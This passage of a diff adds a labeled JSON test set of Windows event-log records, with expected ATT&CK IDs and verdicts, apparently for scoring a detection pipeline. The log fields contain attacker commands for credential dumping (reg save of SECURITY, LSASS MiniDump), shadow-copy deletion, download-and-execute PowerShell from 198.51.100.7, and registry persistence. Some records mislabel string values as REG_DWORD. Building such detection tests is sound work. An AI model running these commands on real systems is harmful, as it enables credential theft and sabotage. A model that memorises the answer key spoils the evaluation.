@@ -1,0 +1,897 @@
+{
+ "_beklenti": "docs/beklenti_13_s_kolu.md",
+ "_yazilma_ani": "G kolu kosulduktan SONRA, S hic calistirilmadan once (2026-08-31). Beklenen cevaplar ATT&CK korpusundan ve Windows olay tanimlarindan yazildi; sistemin ciktisina BAKILMADI.",
+ "_bilinen_kusur": "4656 + yazma maskesi + kritik anahtar ucluSU BILINEN bir yanlis alarm kaynagidir (Gorev 16). Bu sette DOZU 3 kayitla sinirlidir; S'teki orani sistemin ayirt etme gucu degil, bu bilinen kusurun sikligidir.",
+ "_uretici": "scripts/build_s_arm_set.py",
+ "attack_version": "19.1",
+ "kayit_sayisi": 60,
+ "karar_dagilimi": {
+  "INSUFFICIENT_DATA": 14,
+  "SUFFICIENT_SUSPICIOUS": 43,
+  "SUFFICIENT_BENIGN": 3
+ },
+ "negatif_ornek": 17,
+ "b1_cift_sayisi": 3,
+ "kayitlar": [
+  {
+   "id": "S-B1-1A",
+   "event_id": "4656",
+   "input": "Timestamp=\"2026-08-31 09:14:37\" EventID=4656 Hostname=WINHOST-01 Message=\"A handle to an object was requested.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  svc-inventory  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SAM\\SAM\\Domains\\Account  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Transaction ID:  {00000000-0000-0000-0000-000000000000}  Accesses:  READ_CONTROL  Query key value  Set key value  Create sub-key  Enumerate sub-keys  Notify about changes to keys  Access Reasons:  -  Access Mask:  0x2001F  Privileges Used for Access Check:  -\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": true,
+   "b1_pair": "P1",
+   "b1_half": "A",
+   "rationale": "4656 = handle TALEBI. Maske (0x2001F) yazma biti tasiyor ama 4656'da maske ISTENEN haktir, kullanilmis hak degil; gerceklesen erisim 4663'tur. Anahtar kritik (SAM\\Domains\\Account) ama TALEP tek basina erisim kaniti degildir. Bu satir 'incelenmeli' olur, alarm olmaz.",
+   "attack_source": "Windows 4656 tanimi: 'A handle to an object was requested' -- config/event_semantics.yaml, Gorev 3'te yazilan not",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B1-1B",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:15:14\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  svc-inventory  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SAM\\SAM\\Domains\\Account  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1003.002"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "b1_pair": "P1",
+   "b1_half": "B",
+   "rationale": "4663 = GERCEKLESEN erisim, ve kullanilan hak 'Set key value'. Kritik anahtara (SAM\\Domains\\Account) yazma gerceklesti. Ciftin A yarisiyla TEK farki olay ID ve onun getirdigi anlam; anahtar, aktor, surec ve maske ayni.",
+   "attack_source": "T1003.002 OS Credential Dumping: Security Account Manager (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B1-2A",
+   "event_id": "4656",
+   "input": "Timestamp=\"2026-08-31 09:15:51\" EventID=4656 Hostname=WINHOST-01 Message=\"A handle to an object was requested.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  svc-inventory  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SECURITY\\Policy\\Secrets  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Transaction ID:  {00000000-0000-0000-0000-000000000000}  Accesses:  READ_CONTROL  Query key value  Set key value  Create sub-key  Enumerate sub-keys  Notify about changes to keys  Access Reasons:  -  Access Mask:  0x2001F  Privileges Used for Access Check:  -\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": true,
+   "b1_pair": "P2",
+   "b1_half": "A",
+   "rationale": "4656 = handle TALEBI. Maske (0x2001F) yazma biti tasiyor ama 4656'da maske ISTENEN haktir, kullanilmis hak degil; gerceklesen erisim 4663'tur. Anahtar kritik (SECURITY\\Policy\\Secrets) ama TALEP tek basina erisim kaniti degildir. Bu satir 'incelenmeli' olur, alarm olmaz.",
+   "attack_source": "Windows 4656 tanimi: 'A handle to an object was requested' -- config/event_semantics.yaml, Gorev 3'te yazilan not",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B1-2B",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:16:28\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  svc-inventory  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SECURITY\\Policy\\Secrets  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1003.004"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "b1_pair": "P2",
+   "b1_half": "B",
+   "rationale": "4663 = GERCEKLESEN erisim, ve kullanilan hak 'Set key value'. Kritik anahtara (SECURITY\\Policy\\Secrets) yazma gerceklesti. Ciftin A yarisiyla TEK farki olay ID ve onun getirdigi anlam; anahtar, aktor, surec ve maske ayni.",
+   "attack_source": "T1003.004 OS Credential Dumping: LSA Secrets (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B1-3A",
+   "event_id": "4656",
+   "input": "Timestamp=\"2026-08-31 09:17:05\" EventID=4656 Hostname=WINHOST-01 Message=\"A handle to an object was requested.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  svc-inventory  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Transaction ID:  {00000000-0000-0000-0000-000000000000}  Accesses:  READ_CONTROL  Query key value  Set key value  Create sub-key  Enumerate sub-keys  Notify about changes to keys  Access Reasons:  -  Access Mask:  0x2001F  Privileges Used for Access Check:  -\"",
+   "expected_attack_ids": [],
+   "expected_decision": "INSUFFICIENT_DATA",
+   "negative_case": true,
+   "review_flag": true,
+   "b1_pair": "P3",
+   "b1_half": "A",
+   "rationale": "4656 = handle TALEBI. Maske (0x2001F) yazma biti tasiyor ama 4656'da maske ISTENEN haktir, kullanilmis hak degil; gerceklesen erisim 4663'tur. Anahtar kritik (SYSTEM\\CurrentControlSet\\Control\\Lsa) ama TALEP tek basina erisim kaniti degildir. Bu satir 'incelenmeli' olur, alarm olmaz.",
+   "attack_source": "Windows 4656 tanimi: 'A handle to an object was requested' -- config/event_semantics.yaml, Gorev 3'te yazilan not",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B1-3B",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:17:42\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  svc-inventory  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\svchost.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1003.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "b1_pair": "P3",
+   "b1_half": "B",
+   "rationale": "4663 = GERCEKLESEN erisim, ve kullanilan hak 'Set key value'. Kritik anahtara (SYSTEM\\CurrentControlSet\\Control\\Lsa) yazma gerceklesti. Ciftin A yarisiyla TEK farki olay ID ve onun getirdigi anlam; anahtar, aktor, surec ve maske ayni.",
+   "attack_source": "T1003.001 OS Credential Dumping: LSASS Memory (v19.1); Lsa anahtari LSA korumasinin (RunAsPPL) yapilandirmasidir",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-01",
+   "event_id": "4688",
+   "input": "Timestamp=\"2026-08-31 09:18:19\" EventID=4688 Hostname=WINHOST-01 Message=\"A new process has been created.  Creator Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Account Domain:  WINHOST-01  Logon ID:  0x8C112  Process Information:  New Process ID:  0x1a2c  New Process Name:  C:\\Windows\\System32\\reg.exe  Token Elevation Type:  %%1937  Mandatory Label:  Mandatory Label\\High Mandatory Level  Creator Process ID:  0x8f4  Creator Process Name:  C:\\Windows\\System32\\cmd.exe  Process Command Line:  reg.exe save HKLM\\SECURITY C:\\Users\\Public\\sec.hive\"",
+   "expected_attack_ids": [
+    "T1003.004"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "SECURITY kovani diske kaydediliyor; hedef herkesin okudugu konum. Komut satiri olayin artefaktidir, duzyazi iddiasi degil.",
+   "attack_source": "T1003.004 LSA Secrets (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-02",
+   "event_id": "4688",
+   "input": "Timestamp=\"2026-08-31 09:18:56\" EventID=4688 Hostname=WINHOST-01 Message=\"A new process has been created.  Creator Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Account Domain:  WINHOST-01  Logon ID:  0x8C112  Process Information:  New Process ID:  0x1a2c  New Process Name:  C:\\Windows\\System32\\vssadmin.exe  Token Elevation Type:  %%1937  Mandatory Label:  Mandatory Label\\High Mandatory Level  Creator Process ID:  0x8f4  Creator Process Name:  C:\\Windows\\System32\\cmd.exe  Process Command Line:  vssadmin.exe delete shadows /all /quiet\"",
+   "expected_attack_ids": [
+    "T1490"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Golge kopyalarin sessizce silinmesi kurtarmayi engeller; fidye zincirinin standart adimi.",
+   "attack_source": "T1490 Inhibit System Recovery (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-03",
+   "event_id": "4688",
+   "input": "Timestamp=\"2026-08-31 09:19:33\" EventID=4688 Hostname=WINHOST-01 Message=\"A new process has been created.  Creator Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Account Domain:  WINHOST-01  Logon ID:  0x8C112  Process Information:  New Process ID:  0x1a2c  New Process Name:  C:\\Windows\\System32\\wbem\\WMIC.exe  Token Elevation Type:  %%1937  Mandatory Label:  Mandatory Label\\High Mandatory Level  Creator Process ID:  0x8f4  Creator Process Name:  C:\\Windows\\System32\\cmd.exe  Process Command Line:  wmic.exe shadowcopy delete\"",
+   "expected_attack_ids": [
+    "T1490"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Ayni amac, farkli ikili -- tespitin arac adina degil eyleme bagli olmasi gerektigini olcer.",
+   "attack_source": "T1490 Inhibit System Recovery (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-04",
+   "event_id": "4688",
+   "input": "Timestamp=\"2026-08-31 09:20:10\" EventID=4688 Hostname=WINHOST-01 Message=\"A new process has been created.  Creator Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Account Domain:  WINHOST-01  Logon ID:  0x8C112  Process Information:  New Process ID:  0x1a2c  New Process Name:  C:\\Windows\\System32\\rundll32.exe  Token Elevation Type:  %%1937  Mandatory Label:  Mandatory Label\\High Mandatory Level  Creator Process ID:  0x8f4  Creator Process Name:  C:\\Windows\\System32\\cmd.exe  Process Command Line:  rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 684 C:\\Users\\Public\\out.dmp full\"",
+   "expected_attack_ids": [
+    "T1003.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "comsvcs.dll MiniDump ile LSASS bellek dokumu; imzali ikili uzerinden yasayan-topraktan teknik.",
+   "attack_source": "T1003.001 LSASS Memory (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-05",
+   "event_id": "4104",
+   "input": "Timestamp=\"2026-08-31 09:20:47\" EventID=4104 Hostname=WINHOST-01 Message=\"Creating Scriptblock text (1 of 1):  IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')  ScriptBlock ID: 8f2c1b90-0d1a-4a77-9b2e-5c4d3e2f1a09  Path:\"",
+   "expected_attack_ids": [
+    "T1059.001",
+    "T1105"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Uzaktan indirilen kodun bellekte calistirilmasi. Script blok metni gercek kanittir -- iddia degil.",
+   "attack_source": "T1059.001 PowerShell + T1105 Ingress Tool Transfer (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-06",
+   "event_id": "7045",
+   "input": "Timestamp=\"2026-08-31 09:21:24\" EventID=7045 Hostname=WINHOST-01 Message=\"A service was installed in the system.  Service Name:  UpdaterSvc  Service File Name:  C:\\Users\\Public\\updater.exe  Service Type:  user mode service  Service Start Type:  auto start  Service Account:  LocalSystem\"",
+   "expected_attack_ids": [
+    "T1543.003"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Servis ikilisi C:\\Users\\Public'te ve otomatik basliyor; mesru servisler bu konumdan calismaz.",
+   "attack_source": "T1543.003 Create or Modify System Process: Windows Service (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-07",
+   "event_id": "4697",
+   "input": "Timestamp=\"2026-08-31 09:22:01\" EventID=4697 Hostname=WINHOST-01 Message=\"A service was installed in the system.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Service Information:  Service Name:  PSEXESVC  Service File Name:  C:\\Windows\\PSEXESVC.exe  Service Type:  0x10  Service Start Type:  3  Service Account:  LocalSystem\"",
+   "expected_attack_ids": [
+    "T1569.002"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "PSEXESVC uzaktan komut yurutmenin imzasidir; 4697 guvenlik gunlugu tarafindaki servis kurulum kaydi.",
+   "attack_source": "T1569.002 System Services: Service Execution (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-08",
+   "event_id": "4698",
+   "input": "Timestamp=\"2026-08-31 09:22:38\" EventID=4698 Hostname=WINHOST-01 Message=\"A scheduled task was created.  Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Task Name:  \\Updater  Task Content:  <Task><Triggers><LogonTrigger/></Triggers><Actions><Exec><Command>C:\\Users\\Public\\u.exe</Command></Exec></Actions></Task>\"",
+   "expected_attack_ids": [
+    "T1053.005"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Oturum acmada tetiklenen gorev, kullanici yazilabilir konumdaki ikiliyi calistiriyor -- kalicilik.",
+   "attack_source": "T1053.005 Scheduled Task/Job: Scheduled Task (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-09",
+   "event_id": "4702",
+   "input": "Timestamp=\"2026-08-31 09:23:15\" EventID=4702 Hostname=WINHOST-01 Message=\"A scheduled task was updated.  Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Task Name:  \\Microsoft\\Windows\\Defrag\\ScheduledDefrag  Task Content:  <Task><Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -enc SQBFAFgA</Arguments></Exec></Actions></Task>\"",
+   "expected_attack_ids": [
+    "T1053.005"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "MEVCUT bir Windows gorevinin icerigi degistirilmis -- yeni gorev olusturmaktan daha sinsi; gizli+kodlanmis PowerShell.",
+   "attack_source": "T1053.005 Scheduled Task (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-10",
+   "event_id": "1102",
+   "input": "Timestamp=\"2026-08-31 09:23:52\" EventID=1102 Hostname=WINHOST-01 Message=\"The audit log was cleared.  Subject:  Security ID:  WINHOST-01\\jdoe  Account Name:  jdoe  Domain Name:  WINHOST-01  Logon ID:  0x8C112\"",
+   "expected_attack_ids": [
+    "T1685.005"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Denetim gunlugunun temizlenmesi izlerin silinmesidir ve rutin yonetim isi degildir.",
+   "attack_source": "T1685.005 Clear Windows Event Logs (v19.1; T1070.001 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-11",
+   "event_id": "104",
+   "input": "Timestamp=\"2026-08-31 09:24:29\" EventID=104 Hostname=WINHOST-01 Message=\"The System log file was cleared.  User:  WINHOST-01\\jdoe  Channel:  System\"",
+   "expected_attack_ids": [
+    "T1685.005"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "1102'nin System kanali karsiligi; ayni teknigin farkli olay ID'siyle gorunmesi.",
+   "attack_source": "T1685.005 Clear Windows Event Logs (v19.1; T1070.001 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-12",
+   "event_id": "1",
+   "input": "Timestamp=\"2026-08-31 09:25:06\" EventID=1 Hostname=WINHOST-01 Message=\"Process Create:  RuleName: -  UtcTime: 2026-08-31 09:14:02.113  ProcessId: 7712  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  CommandLine: powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA  User: WINHOST-01\\jdoe  ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\"",
+   "expected_attack_ids": [
+    "T1059.001",
+    "T1027"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Word'un cocugu olarak gizli+kodlanmis PowerShell -- ust surec iliskisi kanitin parcasi.",
+   "attack_source": "T1059.001 PowerShell + T1027 Obfuscated Files or Information (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-13",
+   "event_id": "11",
+   "input": "Timestamp=\"2026-08-31 09:25:43\" EventID=11 Hostname=WINHOST-01 Message=\"File created:  RuleName: -  UtcTime: 2026-08-31 09:15:44.002  ProcessId: 7712  Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe  TargetFilename: C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\run.vbs\"",
+   "expected_attack_ids": [
+    "T1547.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Baslangic klasorune dosya birakma -- registry'ye dokunmayan kalicilik yolu.",
+   "attack_source": "T1547.001 Registry Run Keys / Startup Folder (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-A-14",
+   "event_id": "8",
+   "input": "Timestamp=\"2026-08-31 09:26:20\" EventID=8 Hostname=WINHOST-01 Message=\"CreateRemoteThread detected:  RuleName: -  UtcTime: 2026-08-31 09:16:10.551  SourceProcessId: 7712  SourceImage: C:\\Users\\Public\\u.exe  TargetProcessId: 684  TargetImage: C:\\Windows\\System32\\lsass.exe  StartAddress: 0x00007FFB1C2A1000\"",
+   "expected_attack_ids": [
+    "T1055"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "LSASS'a uzaktan is parcacigi enjeksiyonu; hedef surecin kendisi kanitin agirligini tasiyor.",
+   "attack_source": "T1055 Process Injection (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-01",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:26:57\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  Object Value Name:  Updater  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Users\\Public\\u.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  0  New Value Type:  REG_DWORD  New Value:  1\"",
+   "expected_attack_ids": [
+    "T1547.001"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Run anahtarina yazma gerceklesti (autorun-run / high).",
+   "attack_source": "T1547.001 Registry Run Keys (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-02",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:27:34\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon  Object Value Name:  Shell  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  explorer.exe  New Value Type:  REG_DWORD  New Value:  explorer.exe, C:\\Users\\Public\\u.exe\"",
+   "expected_attack_ids": [
+    "T1547.004"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Winlogon Shell degeri degistirildi; her oturum acmada calisir.",
+   "attack_source": "T1547.004 Winlogon Helper DLL (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-03",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:28:11\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe  Object Value Name:  Debugger  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  -  New Value Type:  REG_DWORD  New Value:  C:\\Windows\\System32\\cmd.exe\"",
+   "expected_attack_ids": [
+    "T1546.012"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "IFEO Debugger ile erisilebilirlik ikilisinin ele gecirilmesi.",
+   "attack_source": "T1546.012 Image File Execution Options Injection (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-04",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:28:48\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  jdoe  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1685"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Defender politikasina GERCEKLESEN yazma. defender-policy ailesi hicbir aktor icin bastirilmaz (actor_baseline gerekcesi).",
+   "attack_source": "T1685 Disable or Modify Tools (v19.1; T1562.001 REVOKED)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-05",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:29:25\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest  Object Value Name:  UseLogonCredential  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  0  New Value Type:  REG_DWORD  New Value:  1\"",
+   "expected_attack_ids": [
+    "T1112"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "WDigest'in duz metin kimlik bilgisi saklamasini ACAN degisiklik; 0 -> 1 yonu kanitin kendisi.",
+   "attack_source": "T1112 Modify Registry (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-06",
+   "event_id": "4663",
+   "input": "Timestamp=\"2026-08-31 09:30:02\" EventID=4663 Hostname=WINHOST-01 Message=\"An attempt was made to access an object.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  jdoe  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Server:  Security  Object Type:  Key  Object Name:  \\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend  Handle ID:  0x2f4  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Access Request Information:  Accesses:  Set key value  Access Mask:  0x2001F\"",
+   "expected_attack_ids": [
+    "T1543.003"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "Servis anahtarina gerceklesen yazma (service / high) ve hedef guvenlik servisi.",
+   "attack_source": "T1543.003 Windows Service (v19.1)",
+   "attack_version": "19.1",
+   "labeled_without_running_pipeline": true
+  },
+  {
+   "id": "S-B-07",
+   "event_id": "4657",
+   "input": "Timestamp=\"2026-08-31 09:30:39\" EventID=4657 Hostname=WINHOST-01 Message=\"A registry value was modified.  Subject:  Security ID:  NT AUTHORITY\\SYSTEM  Account Name:  WINHOST-01$  Account Domain:  WORKGROUP  Logon ID:  0x3E7  Object:  Object Name:  \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows  Object Value Name:  AppInit_DLLs  Handle ID:  0x3c8  Operation Type:  Existing registry value modified  Process Information:  Process ID:  0x2b8  Process Name:  C:\\Windows\\System32\\reg.exe  Change Information:  Old Value Type:  REG_DWORD  Old Value:  -  New Value Type:  REG_DWORD  New Value:  C:\\Users\\Public\\h.dll\"",
+   "expected_attack_ids": [
+    "T1546.010"
+   ],
+   "expected_decision": "SUFFICIENT_SUSPICIOUS",
+   "negative_case": false,
+   "review_flag": false,
+   "rationale": "AppInit_DLLs her user32.dll yukleyen surece DLL enjekte eder.",
